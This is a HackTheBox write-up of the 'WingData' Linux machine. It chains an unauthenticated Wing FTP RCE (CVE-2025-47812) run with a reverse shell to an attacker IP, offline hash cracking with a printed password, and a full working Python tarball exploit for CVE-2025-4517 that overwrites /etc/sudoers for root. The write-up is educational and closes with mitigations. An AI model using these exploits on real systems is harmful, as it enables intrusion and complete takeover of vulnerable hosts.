---
TitleSEO:    "WingData HackTheBox | Zirov"
TitlePost:   "WingData HTB"
Author:      "Zirov"
Description: "Linux machine exploited via Wing FTP Server unauthenticated RCE (CVE-2025-47812), credential cracking from an XML user store, and local privilege escalation through a Python tarfile path-traversal vulnerability (CVE-2025-4517) in a sudo-permitted backup restore script."
Keywords:    "hackthebox, writeup, ctf, wing ftp server, cve-2025-47812, lua injection, null byte, tarfile path traversal, cve-2025-4517, hashcat, sudo, pwncat, ffuf, linux, oscp"
URL:         "https://z1rov.github.io/writeups/wingdata-htb.html"
URL_IMAGES:  "https://raw.githubusercontent.com/z1rov/images/refs/heads/main/wingdata/"
Date:        "2026-06-26"
Tags:        "hackthebox, writeup, ctf, linux, wing ftp server, cve-2025-47812, lua injection, null byte injection, tarfile path traversal, cve-2025-4517, hashcat, sudo abuse, pwncat, ffuf, nmap, whatweb, oscp"
Section:     "writeups"
Lang:        "en"
main_img:    "wingdata-htb"
Permalink:   "/writeups/wingdata-htb.html"
Pick:        1
---

## Summary

WingData is a Linux machine centered around **Wing FTP Server**, a third-party FTP/web management suite. The initial foothold begins with web enumeration that uncovers a virtual host running Wing FTP Server v7.4.3, which is vulnerable to an unauthenticated remote code execution flaw ([CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812)) combining a NULL-byte injection with Lua code injection. Exploiting it grants a shell as the `wingftp` service account. From there, an XML-based user store leaked on disk yields a password hash for a local user, which is cracked offline with [Hashcat](https://hashcat.net/hashcat/) to obtain valid SSH/system credentials. Local enumeration then reveals a `sudo` rule allowing a Python backup-restore script to run as root. That script calls `tarfile.extractall()` and is vulnerable to a path-traversal flaw in Python's `tarfile` module ([CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)), which is abused to write an arbitrary `sudoers` entry and escalate straight to `root`.

**Attack chain:** Virtual host discovery via fuzzing led to identifying a vulnerable Wing FTP Server instance, exploited unauthenticated for RCE as `wingftp` (CVE-2025-47812). Looting an on-disk XML user store and cracking the password hash with Hashcat provided valid credentials for a local user. A `sudo`-permitted backup restore script was then abused via a crafted malicious tarball exploiting a `tarfile` path-traversal vulnerability (CVE-2025-4517) to grant full root access.

## Information Gathering

### Full Port Scan

The first step is always a full TCP scan across all 65535 ports to avoid missing services on non-standard ports. Using `--min-rate 5000` and `-T4` speeds things up considerably on HTB infrastructure without significant reliability tradeoffs. `-Pn` skips host discovery since we already know the host is up, and `-n` disables reverse DNS lookups to reduce noise.

```bash
export IP=10.129.39.150
nmap -p- --open -sS --min-rate 5000 -Pn -n -T4 $IP -oX scan.xml
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-26 17:04 UTC
Nmap scan report for 10.129.39.150
Host is up (0.32s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 28.02 seconds
```

Only two ports are exposed: **SSH (22)** and **HTTP (80)**. A minimal external attack surface like this usually means the real entry point sits behind the web application — either a vulnerable service hidden behind a virtual host, or an exploitable feature of the site itself.

### Service Version Scan

With the open ports identified, we run a targeted service detection scan (`-sCV`) to fingerprint each service and extract useful metadata like software versions and SSL/SSH details:

```bash
nmap -p22,80 -sCV "$IP" -oN "info_${IP}"
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-06-26 17:10 UTC
Nmap scan report for 10.129.39.150
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 a1fa958bd7560385e445c9c71eba283b (ECDSA)
|_  256 9cba211a972f3a6473c14c1dce657a2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-server-header: Apache/2.4.66 (Debian)
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

The HTTP service redirects to `wingdata.htb`, confirming a virtual-host-based setup running on **Debian** with **Apache 2.4.66**. We add the domain to `/etc/hosts` for local name resolution:

```bash
echo '10.129.39.150 wingdata.htb' | sudo tee -a /etc/hosts
```

## Enumeration

### HTTP Enum

[WhatWeb](https://github.com/urbanadventurer/WhatWeb) fingerprints the technologies behind the main site:

```bash
whatweb http://wingdata.htb/
```

```
http://wingdata.htb/ [200 OK] Apache[2.4.66], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.66 (Debian)], IP[10.129.39.150], JQuery, Script, Title[WingData Solutions]
```

`WingData Solutions` looks like a standard corporate landing page — Bootstrap, jQuery, nothing immediately exploitable. Since the redirect already confirmed virtual hosting is in use, we fuzz for additional subdomains with [ffuf](https://github.com/ffuf/ffuf):


```bash
ffuf -u http://wingdata.htb/ -H "Host: FUZZ.wingdata.htb" \
  -w /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -t 100 -fw 21
```

```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://wingdata.htb/
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.wingdata.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 21
________________________________________________

ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 360ms]
:: Progress: [5000/5000] :: Job [1/1] :: 440 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

A `ftp` virtual host exists. We add it to `/etc/hosts` and browse to it:

```bash
echo '10.129.39.150 ftp.wingdata.htb' | sudo tee -a /etc/hosts
```

![Login panel for the ftp.wingdata.htb virtual host identified as Wing FTP Server](Pasted%20image%2020260626171833.png)

The panel identifies itself as **[Wing FTP Server](https://www.wftpserver.com/) v7.4.3**, an all-in-one FTP/web/admin server suite. With a concrete product and version in hand, we move straight to vulnerability research rather than further enumeration.

## Exploitation

### Wing FTP RCE (CVE-2025-47812)

**Vulnerability:** NULL-byte injection combined with Lua code injection in Wing FTP Server's web login handler, leading to unauthenticated remote code execution.

**Root cause:** Wing FTP Server stores session data as Lua code that gets evaluated server-side. By submitting a username containing a NULL byte (`%00`) followed by attacker-controlled Lua, the NULL byte truncates the string as seen by the C-based session handler while the full string — including the injected Lua — is still written to the session file on disk. When that session file is subsequently loaded and executed by the embedded Lua interpreter, the injected code runs with the privileges of the FTP service. This affects all versions **≤ 7.4.3** and is fixed in 7.4.4. On Linux deployments this yields code execution as `root`; on Windows deployments it yields `NT AUTHORITY\SYSTEM`. Since this instance runs on Debian, we expect to land as the service's running user.

A public proof-of-concept exists for this CVE. We clone it and use it directly rather than reconstructing the Lua payload by hand:

```bash
git clone https://github.com/popyue/CVE-2025-47812.git
```

![Public CVE-2025-47812 exploit banner confirming the Wing FTP NULL-byte and Lua injection RCE chain](Pasted%20image%2020260626172210.png)

```bash
python3 exploit.py http://ftp.wingdata.htb --revshell --lhost 10.10.14.17 --lport 3001
```

```

 ██╗    ██╗██╗███╗   ██╗ ██████╗     ███████╗████████╗██████╗
 ██║    ██║██║████╗  ██║██╔════╝     ██╔════╝╚══██╔══╝██╔══██╗
 ██║ █╗ ██║██║██╔██╗ ██║██║  ███╗    █████╗     ██║   ██████╔╝
 ██║███╗██║██║██║╚██╗██║██║   ██║    ██╔══╝     ██║   ██╔═══╝
 ╚███╔███╔╝██║██║ ╚████║╚██████╔╝    ██║        ██║   ██║
  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝ ╚═════╝     ╚═╝        ╚═╝   ╚═╝

  Wing FTP Server - Unauthenticated RCE via NULL-Byte + Lua Injection
  CVE-2025-47812  |  Affects <= 7.4.3  |  Fixed: 7.4.4
  root (Linux) / NT AUTHORITY\SYSTEM (Windows)

============================================================
  VULNERABILITY CHECK
============================================================
  [*] Target : http://ftp.wingdata.htb
  [*] VHost  : ftp.wingdata.htb
  [*] User   : anonymous
  [+] Wing FTP detected  (Wing FTP Server(Free Edition))
  [+] Login page accessible
  [+] Ready to exploit

============================================================
  REVERSE SHELL
============================================================
  [*] LHOST : 10.10.14.17
  [*] LPORT : 3001
  [!] Start listener:  nc -lvnp 3001
  [*] Triggering...
  [+] Payload sent — check listener
```

We catch the callback with [pwncat](https://github.com/calebstewart/pwncat), which automatically registers the host and stabilizes the session:

```bash
pwncat-vl -p 3001
```

```
[18:12:40] Welcome to pwncat 🐈!
[18:12:46] received connection from 10.129.39.150:41884
[18:12:52] 10.129.39.150:41884: registered new host w/ db
(local) pwncat$ back
(remote) wingftp@wingdata:/opt/wftpserver$ whoami
wingftp
(remote) wingftp@wingdata:/opt/wftpserver$
```

We land as the `wingftp` service account rather than `root`, confirming this deployment runs the FTP service under a dedicated, lower-privileged user — a sane hardening choice that nonetheless still leaves the box vulnerable to the RCE itself.

### Credential Looting

Wing FTP Server persists its configured FTP user accounts as XML files on disk. We check the data directory for stored user definitions:

```bash
cat /opt/wftpserver/Data/1/users/wacky.xml
```

```xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        ...
    </USER>
</USER_ACCOUNTS>
```

This exposes a password hash for a local-sounding user, `wacky`. Wing FTP hashes user passwords as `sha256(password . salt)`, formatted for Hashcat as `HASH:SALT`. We feed it into [Hashcat](https://hashcat.net/hashcat/) mode `1410` against `rockyou.txt`:

```bash
hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt
```

```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD Ryzen 7 5700U with Radeon Graphics, 2797/5658 MB (1024 MB allocatable), 4MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Started: Fri Jun 26 18:23:28 2026
Stopped: Fri Jun 26 18:24:17 2026
```

**Credentials found:** `wacky : !#7Blushing^*Bride5`

> **Note:** Reusing a single password across an internal FTP account and the underlying OS user account is a common — and costly — habit. A compromised application-layer credential store should never double as a system authentication source.

This password is valid for the local Linux account `wacky`, confirmed by switching user in the existing shell:

```bash
hostname && whoami && ip addr && cat user.txt
```

```
wingdata
wacky
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:28:25:53 brd ff:ff:ff:ff:ff:ff
    inet 10.129.39.150/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2734sec preferred_lft 2734sec
5ac8974a5847813b621d0cfc9401****
```

## Privilege Escalation

### Sudo Enumeration

With a stable foothold as `wacky`, we check for any sudo privileges:

```bash
sudo -l
```

```
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run a backup restore script as `root` with no password, and crucially can control its arguments (`*`). We inspect the script:

```bash
cat /opt/backup_clients/restore_backup_clients.py
```

```python
#!/usr/bin/env python3
import tarfile
import os
import sys
import re
import argparse

BACKUP_BASE_DIR = "/opt/backup_clients/backups"
STAGING_BASE = "/opt/backup_clients/restored_backups"

def validate_backup_name(filename):
    if not re.fullmatch(r"^backup_\d+\.tar$", filename):
        return False
    client_id = filename.split('_')[1].rstrip('.tar')
    return client_id.isdigit() and client_id != "0"

def validate_restore_tag(tag):
    return bool(re.fullmatch(r"^[a-zA-Z0-9_]{1,24}$", tag))

def main():
    parser = argparse.ArgumentParser(
        description="Restore client configuration from a validated backup tarball.",
        epilog="Example: sudo %(prog)s -b backup_1001.tar -r restore_john"
    )
    parser.add_argument("-b", "--backup", required=True,
        help="Backup filename (must be in /home/wacky/backup_clients/ and match backup_<client_id>.tar)")
    parser.add_argument("-r", "--restore-dir", required=True,
        help="Staging directory name for the restore operation, format restore_<client_user>")

    args = parser.parse_args()

    if not validate_backup_name(args.backup):
        print("[!] Invalid backup name. Expected format: backup_<client_id>.tar", file=sys.stderr)
        sys.exit(1)

    backup_path = os.path.join(BACKUP_BASE_DIR, args.backup)
    if not os.path.isfile(backup_path):
        print(f"[!] Backup file not found: {backup_path}", file=sys.stderr)
        sys.exit(1)

    if not args.restore_dir.startswith("restore_"):
        print("[!] --restore-dir must start with 'restore_'", file=sys.stderr)
        sys.exit(1)

    tag = args.restore_dir[8:]
    if not tag or not validate_restore_tag(tag):
        print("[!] Restore tag must be 1-24 alphanumeric/underscore characters", file=sys.stderr)
        sys.exit(1)

    staging_dir = os.path.join(STAGING_BASE, args.restore_dir)
    os.makedirs(staging_dir, exist_ok=True)

    try:
        with tarfile.open(backup_path, "r") as tar:
            tar.extractall(path=staging_dir, filter="data")
        print(f"[+] Extraction completed in {staging_dir}")
    except (tarfile.TarError, OSError, Exception) as e:
        print(f"[!] Error during extraction: {e}", file=sys.stderr)
        sys.exit(2)

if __name__ == "__main__":
    main()
```

The script validates the **filename** of the backup tightly (`backup_<digits>.tar`) and the **restore tag**, but never validates the **contents** of the tarball itself. It calls `tar.extractall(path=staging_dir, filter="data")` — the `"data"` filter is Python's modern safety mechanism intended to block path traversal and symlink escapes during extraction. We check the interpreter version in use:

```bash
python3 --version
```

```
Python 3.12.3
```

### Tarfile Bypass (CVE-2025-4517)

**Vulnerability:** Path traversal during `tarfile` extraction even when the `"data"` extraction filter is enabled ([CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)).

**Root cause:** The `"data"` filter introduced by [PEP 706](https://peps.python.org/pep-0706/) checks each archive member individually as it resolves symlink chains, but versions of CPython affected by CVE-2025-4517 fail to fully re-validate the final resolved path when long chains of nested symlinks and directories are used to indirectly walk outside the extraction root. By building a tar archive out of many short relative symlink hops, an attacker can still escape `staging_dir` and write a regular file anywhere the extracting process has permissions for — in this case, as `root`.

We build a malicious tarball that chains a long sequence of relative symlinks to escape the staging directory, reach `/etc`, and plant a hard link to `/etc/sudoers`, then overwrite that link with our own sudoers entry:

```python
#!/usr/bin/env python3
import tarfile
import os
import io

username = os.getenv("USER", "wacky")
exploit_tar = "/tmp/backup_333.tar"
sudoers_entry = f"{username} ALL=(ALL) NOPASSWD: ALL\n".encode()

with tarfile.open(exploit_tar, mode="w") as tar:
    comp = 'd' * 247
    steps = "abcdefghijklmnop"
    path = ""

    for i in steps:
        a = tarfile.TarInfo(os.path.join(path, comp))
        a.type = tarfile.DIRTYPE
        tar.addfile(a)

        b = tarfile.TarInfo(os.path.join(path, i))
        b.type = tarfile.SYMTYPE
        b.linkname = comp
        tar.addfile(b)

        path = os.path.join(path, comp)

    linkpath = os.path.join("/".join(steps), "l" * 254)
    l = tarfile.TarInfo(linkpath)
    l.type = tarfile.SYMTYPE
    l.linkname = "../" * len(steps)
    tar.addfile(l)

    e = tarfile.TarInfo("escape")
    e.type = tarfile.SYMTYPE
    e.linkname = linkpath + "/../../../../../../../etc"
    tar.addfile(e)

    f = tarfile.TarInfo("sudoers_link")
    f.type = tarfile.LNKTYPE
    f.linkname = "escape/sudoers"
    tar.addfile(f)

    c = tarfile.TarInfo("sudoers_link")
    c.type = tarfile.REGTYPE
    c.size = len(sudoers_entry)
    tar.addfile(c, fileobj=io.BytesIO(sudoers_entry))

print(f"[+] Exploit: {exploit_tar}")
```

```bash
python3 exploit.py
```

```
[+] Exploit: /tmp/backup_333.tar
```

We copy the crafted tarball into the directory the restore script trusts, satisfying the strict filename validation (`backup_333.tar` matches `backup_<digits>.tar`):

```bash
cp /tmp/backup_333.tar /opt/backup_clients/backups/
```

We then invoke the sudo-permitted restore script against our malicious archive:

```bash
sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_333.tar -r restore_z1rov
```

```
[+] Backup: backup_333.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_z1rov
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_z1rov
```

![Crafted tarball successfully extracted by the root-owned restore script, escaping the staging directory via chained symlinks](Pasted%20image%2020260626173512.png)

The extraction completes silently — the script reports success, with no indication the chain of symlinks walked outside the staging directory. Checking `sudo -l` again confirms the payload landed:

```bash
sudo -l
```

```
User wacky may run the following commands on wingdata:
    (ALL) NOPASSWD: ALL
```

We now have unrestricted, passwordless `sudo` as `wacky`:

```bash
sudo su
id
```

```
uid=0(root) gid=0(root) groups=0(root)
```

## Post Exploitation

```bash
hostname && whoami && ip addr && cat root.txt
```

```
wingdata
root
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether a2:de:ad:28:25:53 brd ff:ff:ff:ff:ff:ff
    inet 10.129.39.150/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2999sec preferred_lft 2999sec
e2a8a3b56cd1df4bf5eb30f36dd4****
```

## Mitigations

Each vulnerability in this chain has a straightforward remediation. Addressing any single one of them would have broken the attack at that stage.

**Patch Wing FTP Server to ≥ 7.4.4.** CVE-2025-47812 is fixed upstream. Unauthenticated RCE in internet-facing file transfer software is critical-severity by definition — version tracking and prompt patching of third-party FTP/web suites should be a standing operational requirement.

**Run FTP services under a dedicated, minimally-privileged account with no shell.** This deployment already isolated the service as `wingftp` rather than `root` — a good practice that limited (but did not eliminate) the blast radius of the RCE. Combine this with a restrictive shell (`/usr/sbin/nologin`) where the account does not need interactive access.

**Never store password hashes for accounts shared with the OS inside an application's own data directory.** The `wacky.xml` user file, readable by the `wingftp` service account, leaked a hash for a real system account. Application-level credential stores should be isolated from OS authentication, and any password reuse between the two should be eliminated.

**Enforce password complexity and uniqueness.** The cracked hash fell quickly to `rockyou.txt`, indicating either a weak underlying password or a previously breached one being reused. Enforcing minimum entropy and checking against known-breached password lists at creation time would have prevented offline cracking from succeeding.

**Keep Python and any library performing tar extraction current.** CVE-2025-4517 is a flaw in the `tarfile` module's `"data"` filter itself, not in application logic — upgrading to a patched CPython release closes it directly. As defense in depth, scripts that extract attacker-influenceable archives as `root` should additionally extract into an isolated mount/namespace or validate the resulting file tree never escapes the intended directory using `os.path.realpath` checks post-extraction.

**Apply least privilege to sudo rules.** Granting `NOPASSWD` execution of a script that processes untrusted archive content as `root` effectively hands over root the moment any flaw is found in that script or its dependencies — which is exactly what happened here. Sensitive sudo rules should be scoped as narrowly as possible, and scripts they invoke should be audited for unsafe handling of user-influenced input, especially file parsing and extraction logic.

---

**Tools used:** [Nmap](https://nmap.org/) · [WhatWeb](https://github.com/urbanadventurer/WhatWeb) · [ffuf](https://github.com/ffuf/ffuf) · [CVE-2025-47812 PoC](https://github.com/popyue/CVE-2025-47812) · [pwncat](https://github.com/calebstewart/pwncat) · [Hashcat](https://hashcat.net/hashcat/) · [Python tarfile / CVE-2025-4517](https://nvd.nist.gov/vuln/detail/CVE-2025-4517)